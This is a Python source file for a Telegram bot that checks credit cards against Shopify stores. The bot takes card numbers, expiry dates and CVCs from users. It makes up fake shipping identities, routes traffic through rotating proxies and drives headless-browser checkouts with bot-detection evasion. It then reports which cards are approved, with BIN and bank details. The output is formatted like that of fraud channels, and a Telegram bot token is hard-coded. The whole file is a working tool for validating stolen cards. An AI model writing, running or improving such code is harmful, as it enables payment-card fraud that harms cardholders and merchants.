import json
import logging
import time
import random
from pathlib import Path
from telegram.ext import Updater, CommandHandler, ConversationHandler
from playwright.sync_api import sync_playwright, TimeoutError
from faker import Faker
import requests
import asyncio
from concurrent.futures import ThreadPoolExecutor

TELEGRAM_TOKEN = '7495663085:AAH8Mr2aZK7DrS8DFHTxhKqN9uJU1DSNtd0'
USER_DATA_FILE = "user_data.json"
PROXY_FILE = "proxy.txt"
fake = Faker("en_US")

WAIT_SITE, WAIT_CHECK = range(2)

def load_user_data():
    if Path(USER_DATA_FILE).exists():
        try:
            with open(USER_DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

user_data = load_user_data()

def load_proxies(filename=PROXY_FILE):
    try:
        with open(filename) as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except Exception:
        return []

def get_random_proxy(proxies):
    if not proxies:
        return None
    return random.choice(proxies)

def start(update, context):
    update.message.reply_text(
        "Send /setsite <shopify-url> to begin (e.g. /setsite https://nexbelt.com)\n"
        "After setting your site, use /check <card|mm|yyyy|cvc>.\n"
        "You can use /reset at any time to remove your site."
    )
    return WAIT_SITE

def setsite(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    if len(context.args) != 1 or not context.args[0].startswith("http"):
        update.message.reply_text("❗ Usage: /setsite <shopify-url>")
        return WAIT_SITE
    site = context.args[0].strip().rstrip("/")
    msg, product, fake_ship = find_cheapest_and_fake(site)
    if not product:
        update.message.reply_text(f"❌ {msg}")
        return WAIT_SITE
    user_data[str(chat_id)] = {
        "site": site,
        "cheapest_product": product,
        "fake_shipping": fake_ship,
        "user": user
    }
    save_user_data(user_data)
    update.message.reply_text(
        f"✅ Site added!\nCheapest product: {product['title']} – ${product['price']}\n"
        f"Send /check <card|mm|yyyy|cvc> to test a card!\n"
        f"Or /reset to remove your site."
    )
    return WAIT_CHECK

def check(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user.first_name or f"User_{chat_id}"
    udata = user_data.get(str(chat_id))
    if not udata:
        update.message.reply_text("❗ Please /setsite first.")
        return WAIT_SITE
    if len(context.args) != 1 or "|" not in context.args[0]:
        update.message.reply_text("Usage: /check <card|mm|yyyy|cvc>")
        return WAIT_CHECK
    try:
        cc, mm, yyyy, cvc = context.args[0].strip().split("|")
        start_t = time.time()
        status, response, total = run_shopify_checkout_fast(
            udata['site'], udata['cheapest_product'], udata['fake_shipping'], cc, mm, yyyy, cvc
        )
        end_t = time.time()
        msg = build_reply(
            card=f"{cc}|{mm}|{yyyy}|{cvc}",
            price=str(total),
            status=status,
            response=response,
            t_taken=(end_t-start_t),
            user=user
        )
        update.message.reply_text(msg, parse_mode="HTML", disable_web_page_preview=True)
    except Exception as e:
        update.message.reply_text(f"❌ Error: {e}")
    return WAIT_CHECK

def reset(update, context):
    chat_id = str(update.effective_chat.id)
    if chat_id in user_data:
        user_data.pop(chat_id)
        save_user_data(user_data)
        update.message.reply_text("✅ Your site and info have been reset. Use /setsite to start again.")
    else:
        update.message.reply_text("No site to reset. Use /setsite to add one.")
    return WAIT_SITE

def find_cheapest_and_fake(shop_url):
    """Optimized product finder with faster timeouts"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        # Try primary endpoint first with shorter timeout
        endpoint = f"{shop_url}/products.json?limit=50"
        print(f"Fetching products from: {endpoint}")
        
        r = requests.get(endpoint, timeout=15, headers=headers, allow_redirects=True)
        
        if r.status_code != 200:
            return f"Failed to fetch products (Status: {r.status_code})", None, None
        
        try:
            data = r.json()
        except json.JSONDecodeError:
            return "Invalid JSON response from products endpoint", None, None
        
        products = data.get("products", [])
        if not products:
            return "No products found", None, None
        
        # Find cheapest available product quickly
        cheapest = None
        for prod in products[:20]:  # Limit to first 20 products for speed
            if not prod.get("variants"):
                continue
                
            for variant in prod.get("variants", [])[:3]:  # Check max 3 variants per product
                if not variant.get("available", True):
                    continue
                    
                try:
                    price = float(variant.get("price", "999999"))
                except (ValueError, TypeError):
                    continue
                    
                if not cheapest or price < cheapest["price"]:
                    cheapest = {
                        "handle": prod["handle"],
                        "variant_id": variant["id"],
                        "price": price,
                        "title": prod["title"]
                    }
        
        if not cheapest:
            return "No available products found", None, None
        
        # Generate fake shipping info
        fake_ship = {
            "name": fake.name(),
            "email": fake.email(),
            "address": fake.street_address(),
            "city": fake.city(),
            "zip": fake.zipcode(),
            "country": "United States",
            "phone": fake.phone_number()
        }
        
        print(f"Found product: {cheapest['title']} - ${cheapest['price']}")
        return "OK", cheapest, fake_ship
        
    except requests.exceptions.RequestException as e:
        return f"Network error: {str(e)[:50]}", None, None
    except Exception as e:
        return f"Error: {str(e)[:50]}", None, None

def run_shopify_checkout_fast(site, product, shipping, cc, mm, yyyy, cvc):
    """Optimized checkout process with aggressive timeouts and faster execution"""
    proxies = load_proxies()
    proxy_str = get_random_proxy(proxies)
    proxy_arg = {}
    
    if proxy_str:
        try:
            if "@" in proxy_str:
                auth, ip_port = proxy_str.split("@")
                user, pwd = auth.split(":")
                ip, port = ip_port.split(":")
                proxy_arg = {
                    "server": f"http://{ip}:{port}",
                    "username": user,
                    "password": pwd
                }
            else:
                ip, port = proxy_str.split(":")
                proxy_arg = {"server": f"http://{ip}:{port}"}
        except:
            proxy_arg = {}  # Skip proxy if parsing fails
    
    try:
        with sync_playwright() as p:
            # Faster browser launch with minimal options
            browser = p.chromium.launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-background-timer-throttling',
                    '--disable-backgrounding-occluded-windows',
                    '--disable-renderer-backgrounding'
                ]
            )
            
            # Optimized context settings
            context_options = {
                'viewport': {'width': 1280, 'height': 720},
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'locale': 'en-US'
            }
            
            if proxy_arg:
                context_options['proxy'] = proxy_arg
            
            context = browser.new_context(**context_options)
            page = context.new_page()
            
            # Set faster page load strategy
            page.set_default_timeout(20000)  # 20 seconds max for any operation
            page.set_default_navigation_timeout(25000)  # 25 seconds for navigation
            
            try:
                # Step 1: Add to cart (faster)
                print("Adding to cart...")
                page.goto(f"{site}/cart/add?id={product['variant_id']}&quantity=1", 
                         timeout=20000, wait_until='domcontentloaded')
                time.sleep(0.5)  # Minimal delay
                
                # Step 2: Go to checkout
                print("Going to checkout...")
                page.goto(f"{site}/checkout", timeout=20000, wait_until='domcontentloaded')
                time.sleep(0.5)
                
                # Step 3: Fill email quickly
                print("Filling email...")
                email_selectors = [
                    'input[name="checkout[email]"]',
                    'input[type="email"]',
                    '#checkout_email'
                ]
                
                email_filled = False
                for selector in email_selectors:
                    try:
                        page.wait_for_selector(selector, timeout=8000)
                        page.fill(selector, shipping['email'])
                        email_filled = True
                        break
                    except:
                        continue
                
                if not email_filled:
                    browser.close()
                    return "DECLINED", "Email field not found", product["price"]
                
                # Step 4: Fill shipping info rapidly
                print("Filling shipping info...")
                name_parts = shipping['name'].split()
                first_name = name_parts[0] if name_parts else "John"
                last_name = name_parts[-1] if len(name_parts) > 1 else "Doe"
                
                shipping_data = [
                    ('input[name="checkout[shipping_address][first_name]"]', first_name),
                    ('input[name="checkout[shipping_address][last_name]"]', last_name),
                    ('input[name="checkout[shipping_address][address1]"]', shipping['address']),
                    ('input[name="checkout[shipping_address][city]"]', shipping['city']),
                    ('input[name="checkout[shipping_address][zip]"]', shipping['zip']),
                    ('input[name="checkout[shipping_address][phone]"]', shipping['phone'])
                ]
                
                for selector, value in shipping_data:
                    try:
                        page.fill(selector, value, timeout=3000)
                    except:
                        # Try alternative selector quickly
                        field_name = selector.split('[')[-1].split(']')[0].split('_')[-1]
                        alt_selector = f'#{field_name}' if field_name else selector
                        try:
                            page.fill(alt_selector, value, timeout=2000)
                        except:
                            continue
                
                # Step 5: Handle country
                try:
                    page.select_option('select[name="checkout[shipping_address][country]"]', 'United States', timeout=3000)
                except:
                    pass
                
                # Step 6: Continue to shipping
                print("Continuing to shipping...")
                continue_clicked = False
                for btn_selector in ['button[type="submit"]', 'button:has-text("Continue")', '.btn-continue']:
                    try:
                        page.click(btn_selector, timeout=3000)
                        continue_clicked = True
                        break
                    except:
                        continue
                
                if not continue_clicked:
                    browser.close()
                    return "DECLINED", "Continue button not found", product["price"]
                
                # Wait for shipping page
                time.sleep(1.5)
                
                # Step 7: Continue to payment
                print("Continuing to payment...")
                for btn_selector in ['button[type="submit"]', 'button:has-text("Continue")', '.btn-continue']:
                    try:
                        page.click(btn_selector, timeout=3000)
                        break
                    except:
                        continue
                
                time.sleep(1.5)
                
                # Step 8: Get total price quickly
                total_price = product["price"]
                for price_selector in ['.payment-due__price', '.total-line__price', '[data-testid="total-price"]']:
                    try:
                        total_text = page.inner_text(price_selector, timeout=2000)
                        total_price = float(total_text.replace("$", "").replace(",", "").strip())
                        break
                    except:
                        continue
                
                # Step 9: Fill payment info in iframe
                print("Filling payment info...")
                iframe_found = False
                for iframe_selector in ['iframe[src*="card-fields"]', 'iframe[name*="card"]', 'iframe']:
                    try:
                        page.wait_for_selector(iframe_selector, timeout=15000)
                        iframe_found = True
                        break
                    except:
                        continue
                
                if not iframe_found:
                    browser.close()
                    return "DECLINED", "Payment iframe not found", total_price
                
                # Fill card details quickly
                card_data = {
                    "number": cc,
                    "expiry": f"{mm}/{yyyy[-2:]}",
                    "verification_value": cvc
                }
                
                filled_count = 0
                for frame in page.frames:
                    if not frame.url or "card" not in frame.url.lower():
                        continue
                    
                    try:
                        # Try to fill all fields quickly
                        for field_name, value in card_data.items():
                            selectors = {
                                'number': ['input[name="number"]', 'input[placeholder*="card"]'],
                                'expiry': ['input[name="expiry"]', 'input[placeholder*="expiry"]'],
                                'verification_value': ['input[name="verification_value"]', 'input[placeholder*="cvv"]']
                            }
                            
                            for selector in selectors.get(field_name, []):
                                try:
                                    if frame.query_selector(selector):
                                        frame.fill(selector, value, timeout=2000)
                                        filled_count += 1
                                        break
                                except:
                                    continue
                    except:
                        continue
                
                if filled_count < 3:
                    browser.close()
                    return "DECLINED", f"Card fields incomplete ({filled_count}/3)", total_price
                
                # Step 10: Submit payment
                print("Submitting payment...")
                payment_submitted = False
                for btn_selector in ['button[type="submit"]', 'button:has-text("Complete")', 'button:has-text("Pay")']:
                    try:
                        page.click(btn_selector, timeout=5000)
                        payment_submitted = True
                        break
                    except:
                        continue
                
                if not payment_submitted:
                    browser.close()
                    return "DECLINED", "Payment button not found", total_price
                
                # Step 11: Wait for result (shorter wait)
                print("Waiting for result...")
                time.sleep(4)  # Reduced from 8-12 seconds
                
                url = page.url.lower()
                content = page.content().lower()
                browser.close()
                
                # Quick result detection
                if any(keyword in url for keyword in ["thank_you", "success", "confirmation"]):
                    return "APPROVED", "PAYMENT_SUCCESS", total_price
                elif any(keyword in content for keyword in ["3d_secure", "authentication", "verify"]):
                    return "3D", "3DS_REQUIRED", total_price
                elif any(keyword in content for keyword in ["declined", "failed", "insufficient"]):
                    return "DECLINED", "CARD_DECLINED", total_price
                else:
                    return "DECLINED", "UNKNOWN_RESULT", total_price
                    
            except TimeoutError:
                browser.close()
                return "DECLINED", "Timeout - site too slow", product["price"]
            except Exception as e:
                browser.close()
                return "DECLINED", f"Error: {str(e)[:50]}", product["price"]
                
    except Exception as e:
        return "DECLINED", f"Browser error: {str(e)[:50]}", product["price"]

def bin_lookup(bin_number):
    """Faster BIN lookup with shorter timeout"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5, headers=headers)
        if r.status_code == 200:
            d = r.json()
            brand = d.get("scheme", "UNKNOWN").upper()
            card_type = d.get("type", "UNKNOWN").upper()
            level = d.get("brand", "UNKNOWN").upper()
            bank = d.get("bank", {}).get("name", "UNKNOWN")
            country = d.get("country", {}).get("name", "UNKNOWN")
            emoji = d.get("country", {}).get("emoji", "🏳️")
            return brand, card_type, level, bank, country, emoji
    except Exception:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "UNKNOWN", "🏳️"

def build_reply(card, price, status, response, t_taken, user, dev="bunny"):
    n, mm, yy, cvc = card.split("|")
    bin6 = n[:6]
    brand, card_type, level, bank, country, emoji = bin_lookup(bin6)
    if status == "APPROVED":
        stat_emoji = "✅"
        stat_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
    elif status == "3D":
        stat_emoji = "🟡"
        stat_text = "𝐂𝐡𝐞𝐜𝐤 𝟑𝐃/𝐎𝐓𝐏"
    else:
        stat_emoji = "❌"
        stat_text = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
    return f"""┏━━━ 🔍 Shopify Charge ━━━┓
┃ [ﾒ] Card- <code>{card}</code>
┃ [ﾒ] Gateway- Shopify Normal|{price}$ 
┃ [ﾒ] Status- {stat_text} {stat_emoji}
┃ [ﾒ] Response- {response}
━━═━━═━━═━━═━━
┃ [ﾒ] Bin: {bin6}
┃ [ﾒ] Info- {brand} - {card_type} - {level} 💳
┃ [ﾒ] Bank- {bank} 🏦
┃ [ﾒ] Country- {country} - [{emoji}]
━━═━━═━━═━━═━━
┃ [ﾒ] T/t- {t_taken:.2f} s 💨
┃ [ﾒ] Checked By: {user}
━━═━━═━━═━━═━━
┃ [ㇺ] Dev ➺ {dev} 
┗━━━ 𝗕𝗨𝗡𝗡𝗬 ━━━┛
"""

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    updater = Updater(TELEGRAM_TOKEN, use_context=True)
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            CommandHandler('setsite', setsite),
            CommandHandler('reset', reset)
        ],
        states={
            WAIT_SITE: [
                CommandHandler('setsite', setsite),
                CommandHandler('reset', reset)
            ],
            WAIT_CHECK: [
                CommandHandler('check', check),
                CommandHandler('setsite', setsite),
                CommandHandler('reset', reset)
            ],
        },
        fallbacks=[
            CommandHandler('cancel', reset),
            CommandHandler('start', start),
            CommandHandler('setsite', setsite),
            CommandHandler('reset', reset)
        ],
        allow_reentry=True
    )
    updater.dispatcher.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()